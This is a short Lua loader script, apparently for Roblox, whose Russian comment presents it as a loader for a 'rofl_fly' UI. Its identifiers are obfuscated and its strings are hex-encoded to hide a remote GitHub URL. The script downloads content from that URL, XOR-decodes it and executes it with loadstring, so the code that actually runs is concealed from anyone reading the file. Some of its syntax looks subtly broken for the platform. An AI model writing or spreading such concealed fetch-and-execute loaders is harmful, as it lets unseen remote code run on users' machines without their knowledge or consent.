-- main.lua (загрузчик для rofl_fly.ui)
local _0x = string
local _1x = _0x.char
local _3x = {}

for _4x = 1, 255 do _3x[_4x] = _1x(_4x) end

local _5x = function(_6x)
    local _7x = {}
    for _8x = 1, #_6x, 2 do
        _7x[#_7x + 1] = _3x[tonumber(_6x:sub(_8x, _8x + 1), 16)]
    end
    return table.concat(_7x)
end

local _9x = _5x("68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f726f666c5f666c792f726f666c5f666c792e7569")
local _Ax = game:GetService(_5x("4874747053657276696365"))
local _Bx, _Cx = pcall(function() return _Ax:GetAsync(_9x) end)
if _Bx and _Cx then
    local _Dx = {}
    for _Ex = 1, #_Cx do
        _Dx[_Ex] = _3x[string.byte(_Cx, _Ex) ~ 42]
    end
    loadstring(table.concat(_Dx))()
end
